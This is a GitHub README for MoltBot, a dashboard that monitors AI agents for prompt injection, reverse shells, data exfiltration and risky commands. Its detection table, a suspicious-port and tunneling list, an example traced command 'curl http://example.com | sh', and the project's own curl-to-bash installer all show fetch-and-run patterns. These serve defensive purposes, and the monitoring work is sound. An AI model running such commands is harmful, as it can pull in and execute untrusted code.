<div align="center">

# MoltBot Security Dashboard

**Enterprise-grade security monitoring for AI agents and LLM-powered applications.**

[![CI](https://github.com/jfr992/moltbot-security-dashboard/actions/workflows/ci.yml/badge.svg)](https://github.com/jfr992/moltbot-security-dashboard/actions/workflows/ci.yml)
[![Security Scan](https://github.com/jfr992/moltbot-security-dashboard/actions/workflows/security.yml/badge.svg)](https://github.com/jfr992/moltbot-security-dashboard/actions/workflows/security.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)

[Installation](#installation) • [Features](#features) • [Documentation](#documentation) • [Contributing](#contributing)

</div>

---

## Overview

MoltBot is a comprehensive security monitoring solution designed to detect and prevent malicious activity in AI agent systems. It provides real-time visibility into agent operations, network activity, and potential security threats including prompt injection attacks.

### Key Capabilities

- **Prompt Injection Detection** — Identifies attempts to manipulate AI agents through malicious inputs
- **Real-time Activity Monitoring** — Tracks all tool calls, file operations, and command executions
- **Network Traffic Analysis** — Wireshark-style monitoring with protocol breakdown and anomaly detection
- **Command Tracing** — Static and dynamic analysis of executed commands with risk assessment
- **Automated Alerting** — Configurable severity thresholds with actionable recommendations

---

## Installation

### Quick Install (Recommended)

```bash
curl -fsSL https://raw.githubusercontent.com/jfr992/moltbot-security-dashboard/main/install.sh | bash
```

### Manual Installation

```bash
git clone https://github.com/jfr992/moltbot-security-dashboard.git
cd moltbot-security-dashboard
./setup.sh
```

### Requirements

| Component | Version |
|-----------|---------|
| Python | 3.9+ |
| Node.js | 18+ (development only) |
| OS | macOS 10.15+, Linux (Ubuntu 20.04+) |

---

## Usage

Start the dashboard:

```bash
moltbot
```

Access the web interface at `http://localhost:5050`

### Configuration

Environment variables:

| Variable | Default | Description |
|----------|---------|-------------|
| `MOLTBOT_PORT` | `5050` | Dashboard port |
| `MOLTBOT_HOST` | `127.0.0.1` | Bind address |
| `CLAWDBOT_DIR` | `~/.clawdbot` | Agent logs directory |

---

## Features

### Security Detection Engine

| Threat Category | Detection Method | Severity |
|-----------------|------------------|----------|
| Pipe to shell (`curl \| sh`) | Pattern matching | Critical |
| Reverse shells | Signature detection | Critical |
| Data exfiltration | Network analysis | Critical |
| Privilege escalation | Syscall monitoring | High |
| Sensitive file access | Path monitoring | High |
| Encoded payloads | Entropy analysis | Medium |

### Network Monitoring

- Active connection tracking with process attribution
- Protocol breakdown (TCP/UDP/ICMP)
- Remote host analysis with geolocation
- Suspicious port detection (4444, 5555, known C2 ports)
- Tunneling service detection (ngrok, serveo, localtunnel)

### Command Tracing

Analyze commands before or after execution:

- File system access patterns
- Network connection attempts
- Process spawning behavior
- Risk scoring with detailed factors

---

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    React Frontend                        │
│              (Real-time Dashboard UI)                    │
└─────────────────────────┬───────────────────────────────┘
                          │ REST API / WebSocket
┌─────────────────────────▼───────────────────────────────┐
│                    Flask Backend                         │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
│  │  Activity   │  │   Network   │  │    Security     │  │
│  │  Monitor    │  │   Monitor   │  │    Detector     │  │
│  └─────────────┘  └─────────────┘  └─────────────────┘  │
└─────────────────────────┬───────────────────────────────┘
                          │
┌─────────────────────────▼───────────────────────────────┐
│              Agent Session Logs (JSONL)                  │
│                  ~/.clawdbot/agents/                     │
└─────────────────────────────────────────────────────────┘
```

---

## API Reference

### Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/activity` | Recent activity summary |
| `GET` | `/api/alerts` | Security alerts |
| `GET` | `/api/network/detailed` | Full network analysis |
| `POST` | `/api/trace` | Trace command execution |
| `POST` | `/api/security-check` | Run security scan |
| `GET/POST` | `/api/settings` | Dashboard configuration |
| `POST` | `/api/purge` | Purge old logs |
| `POST` | `/api/alert-action` | Take action on alert |

### Example: Trace a Command

```bash
curl -X POST http://localhost:5050/api/trace \
  -H "Content-Type: application/json" \
  -d '{"command": "curl http://example.com | sh"}'
```

Response:
```json
{
  "risk_assessment": "critical",
  "risk_factors": ["Network activity detected", "Pipe to shell"],
  "network_activity": ["NETWORK: Command may access network"],
  "processes_spawned": ["PROCESS: May spawn subprocesses"]
}
```

---

## Security

### Code Scanning

All releases are scanned using:

- **CodeQL** — Static analysis for security vulnerabilities
- **Semgrep** — SAST rules for Python and JavaScript
- **TruffleHog** — Secrets detection
- **Safety/pip-audit** — Python dependency vulnerabilities
- **npm audit** — Node.js dependency vulnerabilities

### Reporting Vulnerabilities

Please report security vulnerabilities via [GitHub Security Advisories](https://github.com/jfr992/moltbot-security-dashboard/security/advisories/new).

---

## Development

### Setup Development Environment

```bash
# Backend
cd dashboard
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Frontend (with hot reload)
cd dashboard-ui
npm install
npm run dev
```

### Running Tests

```bash
# Python
cd dashboard
python -m pytest

# Frontend
cd dashboard-ui
npm test
```

---

## Roadmap

- [ ] Integration with SIEM platforms (Splunk, ELK)
- [ ] Real-time packet capture (libpcap)
- [ ] Machine learning anomaly detection
- [ ] Multi-agent monitoring support
- [ ] Slack/Discord alerting integrations
- [ ] Docker container deployment

---

## Contributing

Contributions are welcome. Please read our [Contributing Guidelines](CONTRIBUTING.md) before submitting a pull request.

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/improvement`)
3. Commit changes (`git commit -am 'Add new feature'`)
4. Push to branch (`git push origin feature/improvement`)
5. Open a Pull Request

---

## License

This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.

---

<div align="center">

**MoltBot** — Security monitoring for the AI age.

[Report Bug](https://github.com/jfr992/moltbot-security-dashboard/issues) • [Request Feature](https://github.com/jfr992/moltbot-security-dashboard/issues)

</div>
